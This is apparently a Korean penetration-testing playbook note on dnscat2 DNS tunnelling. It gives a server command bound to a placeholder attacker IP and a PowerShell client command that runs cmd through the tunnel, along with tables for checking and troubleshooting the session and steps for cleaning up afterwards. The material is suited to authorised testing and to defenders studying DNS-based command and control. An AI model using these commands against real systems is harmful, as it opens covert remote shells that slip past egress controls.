---
tags:
  - 환경/windows
  - 환경/linux
  - 서비스/dns
시작조건: ["대상 호스트 코드 실행", "외부 DNS 질의 가능"]
필요권한: ["대상 호스트 코드 실행 권한"]
필요조건: ["대상에서 외부 DNS 질의 가능", "공격 호스트에서 dnscat2 서버 수신 가능", "dnscat2 client 또는 PowerShell client 준비"]
결과: ["DNS 터널", "C2 세션", "셸"]
---

# dnscat2 DNS 터널링

## 한 줄 판단

대상에서 코드를 실행할 수 있고 대상의 DNS 질의가 공격 호스트 또는 공격자가 제어하는 권한 있는 DNS 경로까지 도달한다면, dnscat2로 명령 및 제어(Command and Control, C2) 채널을 만들어 현재 프로세스 권한의 셸을 얻는다.

## 사용할 때

- HTTP/HTTPS/TCP egress가 제한되지만 DNS 질의는 허용될 때.
- Windows 대상에서 PowerShell 기반 dnscat2 client를 실행할 수 있을 때.
- 일반 reverse shell 포트가 막혀 있고 DNS를 통한 명령 채널이 필요할 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 대상의 DNS 송신 경로 | 대상에서 `nslookup <DOMAIN>` | 질의가 공격 호스트 또는 위임한 권한 있는 DNS 서버까지 도달 |
| 코드 실행 | 대상 shell/PowerShell | client 실행 가능 |
| 서버 수신 | `dnscat2.rb --dns ...` | secret 생성 및 질의 수신 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 대상이 외부 DNS를 질의함 | DNS 터널 가능 | dnscat2 server 시작 |
| dnscat2 server에 secret 표시 | client 인증/암호화 준비 | secret을 client에 적용 |
| `New window created` | 세션 생성 | `window -i <ID>`로 상호작용 |

### 절차
1. 공격 호스트에서 dnscat2 server를 DNS 모드로 시작한다.
2. server가 출력한 secret을 복사해 client 명령에 사용한다.
3. 대상에 dnscat2 client 또는 `dnscat2.ps1`을 준비한다.
4. 대상에서 server 도메인/IP와 secret으로 client를 실행한다.
5. dnscat2 prompt에서 새 window로 들어가 셸을 확인한다.

### Linux 공격 호스트에서 server 시작

```bash
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache
```

확인할 출력:

- `New window created`
- client 실행에 사용할 `--secret` 값.

### Windows 대상에서 PowerShell client 실행

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <SECRET> -Exec cmd
```

확인할 출력:

- server prompt에 새 session/window 생성.

### Linux 공격 호스트에서 dnscat2 세션 진입

```text
dnscat2> ?
dnscat2> window -i 1
```

확인할 출력:

- 대상 cmd 또는 dnscat2 session과 상호작용 가능.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 대상의 `nslookup` 질의가 권한 있는 DNS 경로 또는 server에 도달함 | DNS egress baseline이 유효함 | DNS 터널 후보 | dnscat2 server와 domain 설정 |
| server가 UDP·TCP 53에서 수신하고 secret을 출력함 | listener와 사전 공유 secret이 준비됨 | DNS server 준비 | 같은 domain·secret으로 client 실행 |
| `New window created`와 client 연결이 보임 | DNS 명령 및 제어 채널이 생성됨 | dnscat2 C2 세션 | window에 진입해 명령 실행 확인 |
| Windows window에서 `whoami`·`hostname` 결과가 돌아옴 | DNS 채널을 통한 Windows 명령 실행이 성공함 | Windows 명령 세션 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]] |
| Linux window에서 `id`·`hostname` 결과가 돌아옴 | DNS 채널을 통한 Linux 명령 실행이 성공함 | Linux 명령 세션 | [[Linux 셸 확보 후 초기 열거와 권한 상승]] |
| DNS 질의가 server에 오지 않음 | 대상의 DNS 송신 경로, DNS 위임, resolver 또는 53번 수신 포트 문제 | 터널 미생성 | `nslookup`, packet capture, 방화벽과 domain 위임 확인 |
| 연결되지만 secret 오류가 남 | client·server 사전 공유 값이 다름 | 인증되지 않은 DNS 연결 | server가 출력한 secret 재적용 |
| client는 연결됐지만 shell이 없음 | `-Exec` 또는 client 실행 권한 문제 | dnscat2 제어 window만 확보 | window 유형과 client 옵션 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| DNS baseline | `nslookup` 응답과 server 또는 packet capture의 질의 | resolver 경로와 직접 53 포트 접근을 구분 |
| listener·protocol | UDP·TCP 53 bind와 configured domain | DNS server 준비 여부 확인 |
| 세션 인증 | 동일 secret과 `New window created` | 단순 DNS 질의와 dnscat2 세션을 구분 |
| 셸 권한 | `whoami`, `hostname`, 명령 결과 | dnscat2 process의 실제 사용자와 호스트 확인 |

## 변경 영향과 복구

- 대상에서 dnscat2 client 프로세스를 종료하고 공격 호스트의 dnscat2 server를 중지한다.
- 전달한 `dnscat2.ps1`, client binary와 임시 작업 파일은 해당 피벗 호스트의 정확한 경로에서 삭제한다.
- DNS 위임 record나 임시 방화벽 규칙을 이번 검증에서 추가했다면 변경 전 값을 기준으로 제거하고, 더 이상 질의가 도달하지 않는지 확인한다.

## 관련 상태 라우터

- Windows 명령 세션: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- Linux 명령 세션: [[Linux 셸 확보 후 초기 열거와 권한 상승]]
- 세션에서 새 내부망 경로 확인: [[내부망 경로 확보 후 피벗 구성]]

## 관련 도구

- [[dnscat2]]
- [[powershell]]
